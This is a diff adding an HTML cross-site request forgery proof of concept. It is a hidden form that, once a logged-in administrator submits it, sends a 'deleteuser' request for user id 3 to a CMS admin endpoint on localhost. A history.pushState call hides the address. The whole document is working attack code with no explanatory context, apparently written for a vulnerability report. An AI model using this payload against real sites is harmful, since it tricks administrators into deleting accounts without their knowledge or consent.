@@ -1,0 +1,19 @@
+<html>
+
+<body>
+    <script>
+        history.pushState('', '', '/')
+    </script>
+    <form action="http://localhost/index.php">
+        <input type="hidden" name="mod" value="site" />
+        <input type="hidden" name="op" value="deleteuser" />
+        <input type="hidden" name="id" value="3" />
+        <!--del user with id -->
+        <input type="hidden" name="act" value="manager" />
+        <input type="hidden" name="do" value="user" />
+        <input type="hidden" name="beid" value="1" />
+        <input type="submit" value="Submit request" />
+    </form>
+</body>
+
+</html>
